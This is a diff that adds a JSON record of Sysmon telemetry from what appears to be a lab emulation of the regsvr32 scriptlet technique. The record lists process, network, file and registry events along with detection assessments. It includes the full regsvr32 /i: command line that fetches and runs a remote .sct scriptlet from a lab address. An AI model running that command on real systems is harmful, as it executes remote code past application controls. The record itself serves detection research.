@@ -1,0 +1,78 @@
+{
+  "source": {
+    "collector": "C:\\Tools\\collect-run.ps1",
+    "window_start": "2026-08-10T01:39:25.948Z",
+    "window_end": "2026-08-10T01:39:32.995Z",
+    "event_count_all_channels": 1039,
+    "sysmon_event_count": 927,
+    "raw_events_json_sha256": "8DDBEEA6BBDEC76A5D9F7179CA708B289E7D2F04E5D3A4AC48E8DD2EDE11B7E9",
+    "raw_sysmon_evtx_sha256": "872E2BA4C572F91255989EB06DD02943317FD14F51F7F17E299702CABD824C00"
+  },
+  "process": {
+    "event_id": 1,
+    "utc_time": "2026-08-10T01:39:28.975Z",
+    "process_guid": "{d6daef74-2bd0-6a79-9300-000000000b00}",
+    "process_id": 5208,
+    "image": "C:\\Windows\\System32\\regsvr32.exe",
+    "original_file_name": "REGSVR32.EXE",
+    "file_version": "10.0.19041.1 (WinBuild.160101.0800)",
+    "company": "Microsoft Corporation",
+    "command_line": "\"C:\\Windows\\System32\\regsvr32.exe\" /s /n /u /i:http://192.168.1.50:18081/benign.sct scrobj.dll",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "integrity_level": "System",
+    "sha256": "022CB167A29A32DAE848BE91AEF721C74F1975AF151807DAFCC5ED832DB246B7"
+  },
+  "parent_child": {
+    "launcher": {
+      "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "child_image": "C:\\Windows\\System32\\regsvr32.exe"
+    },
+    "scriptlet_child": {
+      "utc_time": "2026-08-10T01:39:29.057Z",
+      "process_guid": "{d6daef74-2bd1-6a79-9400-000000000b00}",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c echo benign-regsvr32-marker>C:\\lab\\regsvr32-marker.txt",
+      "parent_image": "C:\\Windows\\System32\\regsvr32.exe",
+      "parent_command_line": "\"C:\\Windows\\System32\\regsvr32.exe\" /s /n /u /i:http://192.168.1.50:18081/benign.sct scrobj.dll"
+    }
+  },
+  "network": {
+    "event_id_3_count": 1,
+    "event_id_22_count": 0,
+    "dns_assessment": "No DNS query was expected or observed because the URL used an IP literal.",
+    "connection": {
+      "utc_time": "2026-08-10T01:39:29.004Z",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "protocol": "tcp",
+      "initiated": true,
+      "source_ip": "192.168.1.52",
+      "source_port": 49679,
+      "destination_ip": "192.168.1.50",
+      "destination_port": 18081
+    }
+  },
+  "files": {
+    "event_id_11_relevant_count": 2,
+    "events": [
+      {
+        "image": "C:\\Windows\\System32\\regsvr32.exe",
+        "target_filename": "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\benign[1].sct"
+      },
+      {
+        "image": "C:\\Windows\\System32\\cmd.exe",
+        "target_filename": "C:\\lab\\regsvr32-marker.txt"
+      }
+    ]
+  },
+  "registry": {
+    "event_id_12_relevant_count": 12,
+    "event_id_13_relevant_count": 14,
+    "event_id_14_relevant_count": 0,
+    "representative_targets": [
+      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\regsvr32.exe",
+      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\regsvr32.exe\\JScriptSetScriptStateStarted",
+      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\Content\\CachePrefix"
+    ],
+    "assessment": "The Windows Script JScript telemetry value is a strong supporting signal. Internet Settings and notification writes are normal API state and are not used alone."
+  }
+}
